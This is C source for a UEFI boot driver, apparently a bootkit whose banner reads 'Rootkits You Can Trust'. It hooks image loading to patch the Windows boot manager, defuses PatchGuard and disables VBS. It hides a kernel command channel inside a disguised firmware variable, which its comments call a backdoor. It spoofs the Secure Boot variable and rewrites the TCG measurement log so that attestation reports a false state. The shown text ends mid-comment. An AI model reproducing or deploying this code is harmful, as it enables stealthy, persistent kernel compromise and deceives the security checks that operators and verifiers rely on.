#include "NexusBootDxe.h"
#include "MapNexusCore.h"
#include "../../Include/NexusCoreBoot.h"   /* NEXUS_CORE_BOOT_BLOCK + NXC_STATUS_REPORT_SIZE */
#include "PeRelocate.h"
#include "TcgLogSanitize.h"
#include "TpmPlatformAuthProbe.h"
#include "../NexusTpmDxe/NexusTpmTransport.h"
#include "../NexusTpmDxe/NexusTpmAcpi.h"
#include "../NexusTpmDxe/NexusTcg2.h"

#include <Protocol/Shell.h>
#include <Guid/EventGroup.h>
#include <Library/BaseMemoryLib.h>
#include <Library/DevicePathLib.h>
#include <Library/SynchronizationLib.h>

//
// EFI Driver Version Protocol
//
EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL gNexusBootSupportedEfiVersion =
{
	sizeof(EFI_DRIVER_SUPPORTED_EFI_VERSION_PROTOCOL),
	EFI_2_10_SYSTEM_TABLE_REVISION
};

//
// Driver unload
//
EFI_STATUS
EFIAPI
NexusBootUnload(
	IN EFI_HANDLE ImageHandle
	);

//
// NexusBoot driver protocol
//
EFI_STATUS
EFIAPI
DriverConfigure(
	IN CONST NEXUSBOOT_CONFIGURATION_DATA* ConfigurationData
	);

NEXUSBOOT_DRIVER_PROTOCOL gNexusBootDriverProtocol =
{
	DriverConfigure
};

//
// Default driver configuration used if Configure() is not called
//
NEXUSBOOT_CONFIGURATION_DATA gDriverConfig = {
	FALSE,							// WaitForKeyPress
	TRUE,							// DisableVbs -- preserves the previous unconditional behaviour
	TRUE,							// SpoofSecureBoot -- Tier 1; see the field docs in NexusBoot.h
	FALSE,							// ManuallyMapped -- set by the Loader, never by hand
	FALSE							// SkipPatchGuardDefusal -- one-shot only; see ConsumeBootControl
};

/*
 * Read the one-shot boot-control variable, apply it, and DELETE IT.
 *
 * Called once at entry, before anything is patched and before gRT->GetVariable is hooked -- so
 * this reads the firmware's real variable store, not our own spoof, and cannot recurse into it.
 *
 * (!) THE DELETE IS NOT CLEANUP, IT IS THE FEATURE. NXCMD_BOOTCTL_SKIP_PG leaves PatchGuard alive
 * for a boot; a flag that survived would leave it alive for every boot after, and the symptom of
 * that is a bugcheck hours later with no visible cause. Consuming it here makes a forgotten flag
 * structurally impossible. It is deleted whether or not it is valid, and BEFORE it is acted on --
 * a malformed variable that somehow made the delete path conditional would be a variable that
 * armed itself permanently.
 *
 * Failing to delete is therefore a REFUSAL, not a warning: if the flag cannot be cleared, the
 * honest move is to ignore it and boot normally rather than to enter a state we cannot leave.
 */
STATIC CONST EFI_GUID mBootControlGuid = NXCMD_BOOTCTL_VAR_GUID_INIT;

STATIC
VOID
EFIAPI
ConsumeBootControl(
	VOID
	)
{
	if (gRT == NULL)
		return;

	NXCMD_BOOT_CONTROL Control;
	UINTN Size = sizeof(Control);
	UINT32 Attributes = 0;

	CONST EFI_STATUS ReadStatus = gRT->GetVariable((CHAR16*)NXCMD_BOOTCTL_VAR_NAME,
												   (EFI_GUID*)&mBootControlGuid,
												   &Attributes,
												   &Size,
												   &Control);

	//
	// Absent is the overwhelmingly common case and is not worth a line of console output.
	//
	if (ReadStatus == EFI_NOT_FOUND)
		return;

	//
	// Delete FIRST. See the header comment: the one-shot property has to hold even for a variable
	// we are about to reject, because a variable that cannot be deleted is a variable that arms
	// every subsequent boot.
	//
	CONST EFI_STATUS DeleteStatus = gRT->SetVariable((CHAR16*)NXCMD_BOOTCTL_VAR_NAME,
													 (EFI_GUID*)&mBootControlGuid,
													 0, 0, NULL);
	if (EFI_ERROR(DeleteStatus) && DeleteStatus != EFI_NOT_FOUND)
	{
		Print(L"[NexusBoot] boot-control variable could not be cleared (%r) -- IGNORING it and\r\n"
			  L"[NexusBoot] booting normally. A flag that cannot be consumed must not be obeyed.\r\n",
			  DeleteStatus);
		return;
	}

	if (EFI_ERROR(ReadStatus) || Size != sizeof(Control) || Control.Cookie != NXCMD_BOOTCTL_COOKIE)
	{
		Print(L"[NexusBoot] boot-control variable present but not ours (status %r, %u bytes) --\r\n"
			  L"[NexusBoot] discarded. Booting normally.\r\n", ReadStatus, (UINT32)Size);
		return;
	}

	if ((Control.Flags & NXCMD_BOOTCTL_SKIP_PG) != 0)
	{
		gDriverConfig.SkipPatchGuardDefusal = TRUE;

		CONST INT32 Previous = SetConsoleTextColour(EFI_YELLOW, FALSE);
		Print(L"\r\n[NexusBoot] CONTROL BOOT ARMED: PatchGuard will NOT be defused this boot.\r\n");
		Print(L"[NexusBoot] The flag is already consumed -- the next boot is normal.\r\n\r\n");
		gST->ConOut->SetAttribute(gST->ConOut, Previous);
	}

	//
	// Unknown bits are reported rather than ignored: a flag this side does not implement means the
	// two ends disagree about the wire format, and the caller is entitled to know its request did
	// not happen.
	//
	CONST UINT32 Unknown = Control.Flags & ~(UINT32)NXCMD_BOOTCTL_SKIP_PG;
	if (Unknown != 0)
		Print(L"[NexusBoot] boot-control flags 0x%X are not implemented by this DXE -- ignored.\r\n",
			  Unknown);
}

//
// Bootmgfw.efi handle
//
EFI_HANDLE gBootmgfwHandle = NULL;

//
// EFI runtime globals
//
EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL* gTextInputEx = NULL;
EFI_EVENT gEfiExitBootServicesEvent = NULL;
BOOLEAN gEfiAtRuntime = FALSE;
EFI_EVENT gEfiVirtualNotifyEvent = NULL;
BOOLEAN gEfiGoneVirtual = FALSE;

//
// Original gBS->LoadImage pointer
//
STATIC EFI_IMAGE_LOAD mOriginalLoadImage = NULL;

//
// Original gRT->SetVariable pointer
//
STATIC EFI_SET_VARIABLE mOriginalSetVariable = NULL;

/*
 * The last command we accepted, with whatever NexusCore wrote back into it. Appended to the status
 * report so GetVariable carries the answer.
 *
 * This exists because SetVariable CANNOT return one. Windows captures the caller's buffer into
 * kernel memory before the firmware call and nothing copies it back, so a result written "in place"
 * is written into a copy the caller never sees again. Commands go out over SetVariable; results come
 * back over GetVariable, and this static is the join between them.
 *
 * Zero-initialised, so a status read before any command has ever been sent reports Magic 0 -- which
 * PlatformCtl renders as "no command issued" rather than as a stale or fabricated result.
 */
STATIC NEXUS_COMMAND mLastCommand = { 0 };

//
// Original gRT->GetVariable pointer (Tier 1 SB spoof -- see HookedGetVariable)
//
STATIC EFI_GET_VARIABLE mOriginalGetVariable = NULL;

//
// Our own image base and size, cached at entry from EFI_LOADED_IMAGE_PROTOCOL. Needed ONLY for
// self-relocation when manually mapped (scope 4c) -- see SetVirtualAddressMapEvent. Captured early
// because the protocol lookup needs boot services, which are gone by the time it is used.
//
STATIC UINT8* mSelfImageBase = NULL;

/* Our own PE TimeDateStamp: READ at entry from a known-good base, PUBLISHED into the boot block only
 * after NexusCoreReserve() creates it. The two cannot happen at the same point -- see both sites. */
STATIC UINT32 mDxeIdent = 0;
STATIC UINTN mSelfImageSize = 0;

//
// Coarse lower bound on kernel VA space. NOT an exact MmSystemRangeStart -- it only screens
// obviously-usermode addresses out of the backdoor.
//
// x64 only.
//
// R1 (partially addressed): the old value 0xFFFF080000000000 is itself
// NON-CANONICAL under 4-level paging -- bits 63:47 are not uniform -- so under the common
// configuration the bound admitted a band of addresses guaranteed to #GP on dereference. It
// survived because RtlIsCanonicalAddress had a matching off-by-one (see P7, carried
// forward into NexusPe.c's canonical test) that
// called those addresses canonical, and because it IS canonical under LA57.
//
// Raised to the true canonical kernel base for 4-level paging. Under LA57 the kernel half
// starts lower (0xFF00000000000000), so this stays a conservative screen rather than an exact
// boundary -- which is all it was ever meant to be.
//
#define MM_SYSTEM_RANGE_START	(VOID*)(0xFFFF800000000000)

// Title (adapted from original by Dude719)
#define NEXUSBOOT_TITLE1		L"\r\n ██╗     ██╗            ██╗      ██╗   ██╗ " \
							L"\r\n ████╗ ████║  ██████╗████████╗████████╗╚═╝ " \
							L"\r\n ██║ ██╔═██║██╔════██╗  ██╔══╝   ██╔══╝██╗ " \
							L"\r\n ██║ ╚═╝ ██║██║    ██║  ██║      ██║   ██║ " 
#define NEXUSBOOT_TITLE2		L"\r\n ██║     ██║ ╚███████║  █████╗   █████╗██║ " \
							L"\r\n ╚═╝     ╚═╝  ╚══════╝  ╚════╝   ╚════╝╚═╝ " \
							L"\r\n                                           " \
							L"\r\n        Rootkits You Can Trust (TM)        \r\n"


//
// (Un)hooks a service table pointer, replacing its value with NewFunction and returning the original address.
//
VOID*
SetServicePointer(
	IN OUT EFI_TABLE_HEADER *ServiceTableHeader,
	IN OUT VOID **ServiceTableFunction,
	IN VOID *NewFunction
	)
{
	if (ServiceTableFunction == NULL || NewFunction == NULL)
		return NULL;

	// If this is really needed after boot time at some point the CRC function is easy enough to reimplement
	ASSERT(gBS != NULL);
	ASSERT(gBS->CalculateCrc32 != NULL);

	CONST EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL); // Note: implies cli
	CONST UINTN Cr0 = AsmReadCr0();
	CONST BOOLEAN WpSet = (Cr0 & CR0_WP) != 0;
	if (WpSet)
		AsmWriteCr0(Cr0 & ~CR0_WP);

	VOID* OriginalFunction = InterlockedCompareExchangePointer(ServiceTableFunction,
																*ServiceTableFunction,
																NewFunction);

	// Recalculate the table checksum
	ServiceTableHeader->CRC32 = 0;
	gBS->CalculateCrc32((UINT8*)ServiceTableHeader, ServiceTableHeader->HeaderSize, &ServiceTableHeader->CRC32);

	if (WpSet)
		AsmWriteCr0(Cr0);
	gBS->RestoreTPL(Tpl);

	return OriginalFunction;
}

//
// Boot Services LoadImage hook
//
EFI_STATUS
EFIAPI
HookedLoadImage(
	IN BOOLEAN BootPolicy,
	IN EFI_HANDLE ParentImageHandle,
	IN EFI_DEVICE_PATH_PROTOCOL *DevicePath,
	IN VOID *SourceBuffer OPTIONAL,
	IN UINTN SourceSize,
	OUT EFI_HANDLE *ImageHandle
	)
{
	//
	// ⚠ SET HERE, NOT AT INSTALL TIME. At the point SetServicePointer runs, NexusCoreReserve has not
	// allocated the boot block yet, so NexusCoreSetBootFlag drops the write silently -- that shipped
	// once and produced a trail claiming the hook was never installed while simultaneously reporting
	// that this very function had identified bootmgfw.
	//
	// By the time ANY image loads, the block exists. And the flag now means "the hook RAN", which is
	// the more useful claim: a hook that is installed but never invoked is not distinguishable from
	// one that is absent, from the point of view of everything downstream.
	//
	NexusCoreSetBootFlag(NXC_BOOTFLAG_BOOTMGFW_HOOKED);

	// Try to get a readable file path from the EFI shell protocol if it's available
	EFI_SHELL_PROTOCOL* EfiShellProtocol = NULL;
	CONST EFI_STATUS EfiShellStatus = gBS->LocateProtocol(&gEfiShellProtocolGuid,
															NULL,
															(VOID**)&EfiShellProtocol);
	CHAR16* ImagePath = NULL;
	if (!EFI_ERROR(EfiShellStatus))
	{
		ImagePath = EfiShellProtocol->GetFilePathFromDevicePath(DevicePath);
	}
	if (ImagePath == NULL)
	{
		ImagePath = ConvertDevicePathToText(DevicePath, TRUE, TRUE);
	}

	// We only have a filename to go on at this point. We will determine the final 'is this bootmgfw.efi?' status after the image has been loaded
	CONST BOOLEAN MaybeBootmgfw = ImagePath != NULL
		? StriStr(ImagePath, L"bootmgfw.efi") != NULL || StriStr(ImagePath, L"Bootmgfw_ms.vc") != NULL || StriStr(ImagePath, L"bootx64.efi") != NULL
		: FALSE;
	CONST BOOLEAN IsBoot = (MaybeBootmgfw || (BootPolicy == TRUE && SourceBuffer == NULL));

	// Print what's being loaded or booted
	CONST INT32 OriginalAttribute = SetConsoleTextColour(EFI_GREEN, FALSE);
	Print(L"[HookedLoadImage] %S %S\r\n    (ParentImageHandle = %llx)\r\n",
		(IsBoot ? L"Booting" : L"Loading"), ImagePath, (UINTN)ParentImageHandle);
	if (ImagePath != NULL)
		FreePool(ImagePath);
	RtlSleep(500);

	// Q: If we loaded bootmgfw.efi manually, is there any benefit to flipping BootPolicy to TRUE
	// to make it look like the load request came straight from the boot manager?
	if (MaybeBootmgfw)
	{
		// Let's find out
		BootPolicy = TRUE;
	}

	// Load the image
	CONST EFI_STATUS Status = mOriginalLoadImage(BootPolicy,
												ParentImageHandle,
												DevicePath,
												SourceBuffer,
												SourceSize,
												ImageHandle);

	// Was this a successful load of an image that's being booted?
	if (!EFI_ERROR(Status) && IsBoot && *ImageHandle != NULL)
	{
		// Get loaded image info
		EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
		CONST EFI_STATUS ImageInfoStatus = gBS->OpenProtocol(*ImageHandle,
															&gEfiLoadedImageProtocolGuid,
															(VOID**)&LoadedImage,
															gImageHandle,
															NULL,
															EFI_OPEN_PROTOCOL_GET_PROTOCOL);
		if (EFI_ERROR(ImageInfoStatus))
		{
			Print(L"\r\nHookedLoadImage: failed to get loaded image info. Status: %llx (%r)\r\n",
				ImageInfoStatus, ImageInfoStatus);
		}
		else
		{
			// Determine the type of file we're loading
			CONST INPUT_FILETYPE FileType = GetInputFileType(LoadedImage->ImageBase, LoadedImage->ImageSize);
			//  `FileType == Bootmgr` (legacy non-EFI BIOS boot manager) dropped
			// from this assertion with the Windows-11-only decision -- that enum value no
			// longer exists, and a BIOS bootmgr cannot occur on a UEFI-only target.
			ASSERT(FileType == Unknown || FileType == BootmgfwEfi);

			if (FileType == BootmgfwEfi)
			{
				// ⚠ RECORDED BEFORE ANYTHING CAN FAIL. From here on, a missing "winload patched" is a
				// statement about PatchBootManager/PatchWinload; without this flag it was equally
				// consistent with bootmgfw never having been loaded through our hook at all.
				NexusCoreSetBootFlag(NXC_BOOTFLAG_BOOTMGFW_SEEN);

				// This is bootmgfw.efi. Save the returned image handle
				gBootmgfwHandle = *ImageHandle;
				LoadedImage->ParentHandle = NULL;

				// Print image info
				PrintLoadedImageInfo(LoadedImage);

				// Nuke it dot it
				PatchBootManager(LoadedImage->ImageBase,
								LoadedImage->ImageSize);
			}
		}
	}

	gST->ConOut->SetAttribute(gST->ConOut, OriginalAttribute);
	gST->ConOut->EnableCursor(gST->ConOut, FALSE);

	return Status;
}

//
// Runtime Services SetVariable hook
//
EFI_STATUS
EFIAPI
HookedSetVariable(
	IN CHAR16 *VariableName,
	IN EFI_GUID *VendorGuid,
	IN UINT32 Attributes,
	IN UINTN DataSize,
	IN VOID *Data
	)
{
	//
	// PHASE 4 of the NexusCore map: fire the armed one-shot. This is what removes v1's need for a
	// scheduled task -- Windows calls this hook on its own, so no usermode trigger and no on-disk
	// artifact. Internally gated on being armed (post-SetVirtualAddressMap) and on CR8 == PASSIVE,
	// and it is a one-shot, so calling it on every invocation costs a compare once fired.
	//
	NexusCoreTryLaunch();

	// We should not still be hooked into the runtime table after ExitBootServices() unless we
	// deliberately stayed resident to serve the command channel.
	ASSERT(!gEfiAtRuntime || (NEXUSBOOT_NEEDS_RUNTIME_CHANNEL && gBootmgfwHandle != NULL));

	// Do we have a match for the variable name and vendor GUID?
	if (gEfiAtRuntime && gEfiGoneVirtual &&
		VariableName != NULL && VariableName[0] != CHAR_NULL && VendorGuid != NULL &&
		CompareGuid(VendorGuid, NEXUS_CHANNEL_VARIABLE_GUID) &&
		StrnCmp(VariableName, NEXUS_CHANNEL_VARIABLE_NAME, (sizeof(NEXUS_CHANNEL_VARIABLE_NAME) / sizeof(CHAR16)) - 1) == 0)
	{
		//
		// ====================================================================================
		// NEXUS COMMAND CHANNEL. Checked BEFORE the backdoor form, and matched on MAGIC.
		// ====================================================================================
		//
		// Discriminated by DataSize *and* NEXUS_CMD_MAGIC rather than size alone. The size would
		// probably be enough today, but "probably distinct sizes" is not a protocol: a second
		// request form of equal size would silently alias, and one would be interpreted as the
		// other with a pointer landing in the wrong field.
		//
		// The command is COPIED into a static before anything else touches it. Data points at a
		// kernel buffer Windows captured from usermode, and the handler is about to be given a
		// pointer to it; taking our own copy means the struct the handler validates is the struct
		// the handler acts on, and nothing outside this hook can change it in between.
		//
		if (DataSize == sizeof(NEXUS_COMMAND) && Data != NULL &&
			((CONST NEXUS_COMMAND*)Data)->Magic == NEXUS_CMD_MAGIC)
		{
			CopyMem(&mLastCommand, Data, sizeof(NEXUS_COMMAND));
			mLastCommand.Result = NXCMD_RESULT_PENDING;

			VOID* CONST BlockRaw = NexusCoreGetBootBlock();
			NEXUS_CORE_BOOT_BLOCK* CONST Blk = (NEXUS_CORE_BOOT_BLOCK*)BlockRaw;

			//
			// IRQL GATE -- MANDATORY, not defensive. The handler copies the caller's buffer with
			// MmCopyVirtualMemory, which requires PASSIVE_LEVEL. On x64 CR8 holds the current IRQL,
			// so this costs one instruction and imports nothing, which matters because we have no
			// kernel API of our own here. Same gate as NexusCoreTryLaunch, for the same reason.
			//
			if (Blk == NULL || Blk->CommandHandler == 0)
			{
				// NexusCore has not run, or ran and never reached the point where it publishes
				// CommandHandler. Its OWN code, not NO_ARENA: a driver that never ran and a driver
				// whose arena reservation failed need opposite investigations.
				mLastCommand.Result = NXCMD_RESULT_NO_HANDLER;
				mLastCommand.NtStatus = 0;
			}
			else if (__readcr8() != 0)
			{
				mLastCommand.Result = NXCMD_RESULT_WRONG_IRQL;
			}
			else
			{
				typedef UINTN (*NXC_CMD_FN)(VOID* Command);
				CONST NXC_CMD_FN Handler = (NXC_CMD_FN)(UINTN)Blk->CommandHandler;

				//
				// Return value deliberately ignored: the handler reports through the command struct,
				// which travels back to usermode over GetVariable. A status returned here has
				// nowhere to go -- SetVariable's own result is consumed by the HAL.
				//
				(VOID)Handler(&mLastCommand);
			}

			// Answered. Do NOT fall through to the firmware: this variable does not exist there.
			return EFI_SUCCESS;
		}

		// Yep. Do we have any data?
		if (DataSize == 0 && Data == NULL)
		{
			// Nope. This is the first SetVariable() call from the HAL, intended to wipe the variable.
			// (This call may be skipped if EFI_VARIABLE_APPEND_WRITE is set, but this is version-dependent)
			return EFI_SUCCESS;
		}

	}
	//else { /*Not our variable name + vendor GUID, or SetVirtualAddressMap() has not been called yet*/ }

	return mOriginalSetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);
}

//
// ============================================================================
// TIER 1 OF THE SECURE BOOT SPOOF -- gRT->GetVariable hook
// ============================================================================
//
// Presents Secure Boot as ENABLED by returning `SecureBoot` = 1 when the firmware's real value
// is 0. Read NEXUSBOOT_CONFIGURATION_DATA::SpoofSecureBoot in Include/Protocol/NexusBoot.h
// first -- it documents why this is ONE BYTE on a provisioned platform, and which detection
// rungs it deliberately does not reach.
//
// This must stay installed across ExitBootServices, because the readers that matter most are in
// Windows: GetFirmwareEnvironmentVariableExW, Get-SecureBootUEFI / Confirm-SecureBootUEFI, and
// the WMI providers all end up in gRT->GetVariable at runtime.
//

//
// Is presenting SecureBoot=1 COHERENT with the platform's real mode variables?
//
// Spec-derived on purpose (UEFI Table 32-1) so it generalises to hardware we have never
// measured: SecureBoot=1 is only defined OUTSIDE Setup Mode and Audit Mode. Forcing it on a box
// sitting in Setup Mode would manufacture a combination that cannot occur on real hardware --
// strictly MORE detectable than not spoofing at all. So this fails closed.
//
// MEASURED on the development machine (a committed baseline): SetupMode=00,
// AuditMode=00, DeployedMode=01, and one byte then yields exactly spec Deployed Mode. That is
// NOT hardcoded here, deliberately -- the SAME box has been observed in three genuinely
// different variable sets (SB-off; Audit Mode, where the PK is deleted outright; Deployed), so
// deriving the verdict from live state is not hypothetical caution. See
// An earlier finding.
//
// Reads go through mOriginalGetVariable, never gRT->GetVariable, so this cannot recurse into
// our own hook. Sequential calls, not nested -- no firmware re-entrancy concern.
//
// NOT cached, on purpose: the call is rare (nothing polls SecureBoot in a loop), and a stale
// "coherent" verdict is the single failure mode that produces the impossible machine this gate
// exists to prevent. Correctness over saving two variable reads.
//
STATIC
BOOLEAN
SecureBootSpoofIsCoherent(
	VOID
	)
{
	UINT8 Value = 0;
	UINTN Size = sizeof(Value);

	//
	// SetupMode must be 0 (platform provisioned, PK enrolled). Absent or unreadable -> refuse:
	// SetupMode has existed since UEFI 2.3.1, so its absence means we do not understand this
	// firmware well enough to be editing its Secure Boot state.
	//
	if (EFI_ERROR(mOriginalGetVariable((CHAR16*)EFI_SETUP_MODE_NAME,
										&gEfiGlobalVariableGuid,
										NULL,
										&Size,
										&Value)) ||
		Size != sizeof(Value) ||
		Value != 0)
		return FALSE;

	//
	// AuditMode must be 0. Note EFI_AUDIT_MODE_NAME is NOT in our trimmed GlobalVariable.h
	// (AuditMode is a UEFI 2.6 addition), hence the literal.
	//
	// EFI_NOT_FOUND is ACCEPTED here, unlike SetupMode above: firmware predating 2.6 has no
	// AuditMode variable at all, and on such a platform "not in Audit Mode" is the correct
	// reading rather than an unknown.
	//
	Value = 0;
	Size = sizeof(Value);
	CONST EFI_STATUS Status = mOriginalGetVariable(L"AuditMode",
													&gEfiGlobalVariableGuid,
													NULL,
													&Size,
													&Value);
	if (Status == EFI_NOT_FOUND)
		return TRUE;

	return !EFI_ERROR(Status) && Size == sizeof(Value) && Value == 0;
}

STATIC
EFI_STATUS
EFIAPI
HookedGetVariable(
	IN CHAR16* VariableName,
	IN EFI_GUID* VendorGuid,
	OUT UINT32* Attributes OPTIONAL,
	IN OUT UINTN* DataSize,
	OUT VOID* Data OPTIONAL
	)
{
	//
	// PHASE 4 of the NexusCore map: fire the armed one-shot. This is what removes v1's need for a
	// scheduled task -- Windows calls this hook on its own, so no usermode trigger and no on-disk
	// artifact. Internally gated on being armed (post-SetVirtualAddressMap) and on CR8 == PASSIVE,
	// and it is a one-shot, so calling it on every invocation costs a compare once fired.
	//
	NexusCoreTryLaunch();

	//
	// NEXUSCORE STATUS READ -- the ONLY interception that does not pass through, because the
	// variable does not exist in firmware and the real GetVariable would answer EFI_NOT_FOUND.
	//
	// Reuses the EXISTING backdoor name/GUID rather than adding a second one: SetVariable already
	// takes commands on L"BootOrderCacheV2" under gEfiGlobalVariableGuid, so reading status from the
	// same name is symmetrical (write commands, read status) and keeps exactly ONE non-standard
	// variable name in existence. A second name would be a second thing to find.
	//
	// This is how phases 3 and 4 become observable at all: they run in kernel context where nothing
	// prints, so the boot block plus the launch counters are the only record of what happened. The
	// counters matter as much as the status -- "gate never opened" and "driver ran and failed" are
	// indistinguishable without them, which is the blind-signal trap this project keeps hitting.
	//
	if (VariableName != NULL && VendorGuid != NULL && DataSize != NULL &&
		CompareGuid(VendorGuid, NEXUS_CHANNEL_VARIABLE_GUID) &&
		StrCmp(VariableName, NEXUS_CHANNEL_VARIABLE_NAME) == 0)
	{
		VOID* CONST Block = NexusCoreGetBootBlock();
		if (Block != NULL)
		{
			CONST UINTN NeedBytes = NXC_STATUS_REPORT_SIZE;

			/* Size-probe form, and the too-small case, both answer the same way GetVariable does. */
			if (Data == NULL || *DataSize < NeedBytes)
			{
				*DataSize = NeedBytes;
				if (Attributes != NULL)
					*Attributes = EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS;
				return EFI_BUFFER_TOO_SMALL;
			}

			/* Boot block, then the two launch counters, then the last answered command.
			 * Layout locked in NexusCoreBoot.h -- NXC_STATUS_REPORT_SIZE is the sum of exactly
			 * these three, so a field added to any of them moves the assert, not this code. */
			CopyMem(Data, Block, sizeof(NEXUS_CORE_BOOT_BLOCK));

			UINT32 Calls = 0, Rejected = 0;
			NexusCoreGetLaunchStats(&Calls, &Rejected);
			CopyMem((UINT8*)Data + sizeof(NEXUS_CORE_BOOT_BLOCK), &Calls, sizeof(Calls));
			CopyMem((UINT8*)Data + sizeof(NEXUS_CORE_BOOT_BLOCK) + sizeof(Calls),
					&Rejected, sizeof(Rejected));

			/* ABI 7: the command result. Zeroed until a command has been sent, which PlatformCtl
			 * reads as "none issued" -- distinct from a command that ran and failed. */
			CopyMem((UINT8*)Data + sizeof(NEXUS_CORE_BOOT_BLOCK) + 8u,
					&mLastCommand, sizeof(NEXUS_COMMAND));

			*DataSize = NeedBytes;
			if (Attributes != NULL)
				*Attributes = EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS;
			return EFI_SUCCESS;
		}
		/* Not staged: fall through so the caller sees the firmware's real EFI_NOT_FOUND. */
	}

	//
	// ALWAYS pass through first and keep the firmware's status verbatim. Every caller, including
	// the size-probe form (Data == NULL -> EFI_BUFFER_TOO_SMALL), must see exactly what the
	// firmware said. We only ever edit one byte of an already-successful result.
	//
	CONST EFI_STATUS Status = mOriginalGetVariable(VariableName, VendorGuid, Attributes, DataSize, Data);

	//
	// NARROW PASS-THROUGH (the design rule -- the design notes). Do not enumerate,
	// do not synthesise, do not "complete" the variable set. PK/KEK/db/dbx are the real,
	// Microsoft-signed articles and must reach the caller untouched; dbt/dbr are legitimately
	// absent on this platform and inventing them would create an inconsistency the UNSPOOFED
	// machine does not have.
	//
	if (!gDriverConfig.SpoofSecureBoot ||
		EFI_ERROR(Status) ||
		VariableName == NULL ||
		VendorGuid == NULL ||
		Data == NULL ||
		DataSize == NULL ||
		*DataSize < sizeof(UINT8))
		return Status;

	if (StrCmp(VariableName, EFI_SECURE_BOOT_MODE_NAME) != 0 ||
		!CompareGuid(VendorGuid, &gEfiGlobalVariableGuid))
		return Status;

	//
	// Already enforcing -- nothing to do. Never write unconditionally: if the user switches
	// Secure Boot ON in firmware, the honest value is the correct one.
	//
	if (*(UINT8*)Data != 0)
		return Status;

	if (!SecureBootSpoofIsCoherent())
		return Status;

	*(UINT8*)Data = 1;
	return Status;
}

//
// Is the platform ALREADY enforcing Secure Boot for real?
//
// ⚠ THE LOG TRANSFORM MUST STAND DOWN WHEN IT IS. Tier 2/3 exist to make a Secure-Boot-OFF
// machine MEASURE as Secure-Boot-ON. Once the platform genuinely enforces -- which it now can,
// our certificate having been enrolled into `db` -- running the transform would
// rewrite a log that is ALREADY correct and insert a SECOND EV_EFI_VARIABLE_AUTHORITY record,
// leaving the log disagreeing with the PCRs it claims to explain. That is strictly worse than
// doing nothing, and it is a LOUDER tell than the honest log it replaced.
//
// Same reasoning as SecureBootSpoofIsCoherent(): fail closed when the honest value is already
// the correct one. `gDriverConfig.SpoofSecureBoot` is a CONFIGURED INTENT, not a statement about
// the platform, so neither gate may rest on it alone.
//
// ⚠ Reads through mOriginalGetVariable whenever the hook is installed. Going through
// gRT->GetVariable would return OUR OWN SPOOFED byte, so the check would ask the liar whether it
// is lying and could never fire. The fallback is used only before the hook exists, where the two
// pointers are the same thing.
//
BOOLEAN
SecureBootIsGenuinelyEnforcing(
	VOID
	)
{
	UINT8 Value = 0;
	UINTN Size = sizeof(Value);
	CONST EFI_GET_VARIABLE Get = (mOriginalGetVariable != NULL)
		? mOriginalGetVariable
		: ((gRT != NULL) ? gRT->GetVariable : NULL);

	if (Get == NULL)
		return FALSE;

	if (EFI_ERROR(Get((CHAR16*)EFI_SECURE_BOOT_MODE_NAME, &gEfiGlobalVariableGuid,
					  NULL, &Size, &Value)))
		return FALSE;

	return (BOOLEAN)(Value != 0);
}

//
// ExitBootServices callback
//
VOID
EFIAPI
ExitBootServicesEvent(
	IN EFI_EVENT Event,
	IN VOID* Context
	)
{
	// Close this event now. The boot loader only calls this once.
	gBS->CloseEvent(gEfiExitBootServicesEvent);
	gEfiExitBootServicesEvent = NULL;

	//
	// TIER 3 OF THE SB SPOOF runs HERE, and the call site was hard-won (two hung boots).
	//
	// Requirements that collide: the TCG log is found through ACPI, so its address is PHYSICAL and
	// only usable while IDENTITY-MAPPED (rules out anything inside winload, which has its own page
	// tables -- that hung the box at a black screen). The firmware also APPENDS to the log as each
	// further image is measured, and our transform is not size-neutral, so patching early would let
	// those appends land inside our edits.
	//
	// ExitBootServices satisfies both: still UEFI context, and no measurement happens after it.
	// Allocation is illegal here, which is why InitTcgLogSanitizer() reserved the buffer at entry.
	//
	// Printing IS safe at this point -- the code below prints to gST->ConOut already.
	//
	//
	// The ACPI in-place patch RUNS here, at the earliest safe point, but its RESULT is printed much
	// further down -- see the DEFERRED REPORTING note below.
	//
	UINT32 mTcgOld = 0, mTcgNew = 0, mTcgCap = 0;
	CONST EFI_STATUS TcgAcpiStatus = PatchTcgEventLogInPlace(&mTcgOld, &mTcgNew, &mTcgCap);

	//
	// (review) Record the TCG outcome somewhere that OUTLIVES THE BOOT SCREEN.
	//
	// Both TCG results were reported by Print() further down and nowhere else, so whether the Secure
	// Boot measurement spoof actually worked became unknowable the moment the console scrolled.
	//
	// And those prints sit INSIDE the `Status == EFI_SUCCESS` arm of the kernel-patch report below,
	// so a failed kernel patch suppressed the TCG report entirely -- despite the two being unrelated
	// and this work having already run at line 733. Recording here, BEFORE any of that branching,
	// is what decouples them; the prints stay where they are for readability on the boot screen.
	//
	// This is the FINAL state, not a sample: we are at ExitBootServices and the firmware measures
	// nothing further, so the hook's call count cannot change after this point.
	//
	{
		UINT32 TcgCalls = 0, TcgBytes = 0;
		EFI_STATUS TcgHookStatus = EFI_NOT_READY;
		GetTcgHookDiagnostics(&TcgCalls, &TcgHookStatus, &TcgBytes);

		// Unconditional, no verdict: proves this DXE answers the question, so a clear HOOK_FIRED bit
		// is not confused with a build that predates these flags. Same tri-state as the kernel patch.
		NexusCoreSetBootFlag(NXC_BOOTFLAG_TCG_EVALUATED);
		if (TcgCalls > 0)
			NexusCoreSetBootFlag(NXC_BOOTFLAG_TCG_HOOK_FIRED);
		if (!EFI_ERROR(TcgAcpiStatus))
			NexusCoreSetBootFlag(NXC_BOOTFLAG_TCG_ACPI_OK);
	}

	// The message buffer may be empty if the patch process was aborted in one of the earlier stages
	if (gKernelPatchInfo.Buffer[0] != CHAR_NULL)
	{
		CONST EFI_STATUS Status = gKernelPatchInfo.Status;
		CONST INT32 OriginalAttribute = gST->ConOut->Mode->Attribute;

		// Default to showing a message in case of errors unless we are booting a pre-Vista kernel such as XP, in which case EFI_UNSUPPORTED is expected.
		//  Was `KernelBuildNumber == 0 || KernelBuildNumber >= 6001 || Status !=
		// EFI_UNSUPPORTED` -- the 6001 term suppressed the error banner for pre-Vista-SP1
